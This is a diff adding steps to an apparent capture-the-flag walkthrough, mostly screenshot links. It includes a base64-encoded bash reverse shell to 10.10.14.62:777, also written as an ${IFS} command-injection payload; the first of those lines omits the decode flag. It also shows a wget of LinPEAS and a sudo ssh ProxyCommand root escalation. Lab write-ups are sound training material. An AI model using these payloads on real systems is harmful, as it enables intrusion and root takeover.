@@ -115,7 +115,60 @@ login page
 
 ![image](https://github.com/zer00d4y/writeups/assets/128820441/bdf6f862-c771-4181-8e95-240d76a9d9f6)
 
-
+![image](https://github.com/zer00d4y/writeups/assets/128820441/99c5b146-96c8-47a1-873c-815d6e85ace9)
 
 ![image](https://github.com/zer00d4y/writeups/assets/128820441/49cdc566-a6a5-47a5-b110-1bdd848dd63b)
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/0255c3c8-adef-4cb5-adb3-8e2fab06ca28)
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/1c0f1101-2178-4863-84c7-4e5003277972)
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/d31e8ad4-a152-49c0-bcc5-29da465d70cb)
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/83fb39b1-f380-43c4-bee5-c15feb3ca8b8)
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/d29fba97-e038-42c8-9245-ac74b2c3d120)
+
+`echo "L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjYyLzc3NyAwPiYx"| base64 | bash`
+
+`;$(echo${IFS}"L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjYyLzc3NyAwPiYx"|${IFS}base64${IFS}-d${IFS}|${IFS}bash);`
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/d4d94e81-6e3b-4e1b-a253-0edb88c55b39)
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/e95222cd-6e59-40cf-ba6c-134af8bd49a9)
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/ff18da37-ed48-4323-9ba6-cd7e3c24e35f)
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/63dff361-f552-4c64-9ece-47daf9d48e92)
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/fe19f79f-aad6-45ef-94b5-4258da0abea4)
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/67aa73c6-4be3-4a09-84c4-c55fca1f9634)
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/799423fb-6205-42fe-98b1-971d1d872066)
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/b06e1cf5-55ce-4c17-90e5-a165630730a7)
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/76c5022f-7362-438d-bceb-abee0508028e)
+
+# PrivEsc via LinPEAS
+
+github: https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
+
+https://github.com/carlospolop/PEASS-ng/releases/download/20240226-e0f9d47b/linpeas.sh
+
+`wget https://github.com/carlospolop/PEASS-ng/releases/download/20240226-e0f9d47b/linpeas.sh`
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/1657048e-b830-4341-a053-6e39bf94139a)
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/4637b630-d74e-403a-956c-9dfb8a6524ea)
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/6cb8f88a-b2d6-429c-8564-5b53777af1c4)
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/dfa0772c-1294-4a83-8109-10be76e76c84)
+
+` sudo ssh -o ProxyCommand=';bash 0<&2 1>&2' x`
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/22064478-83c6-4666-9c7e-ae05d4c7df12)
+
 
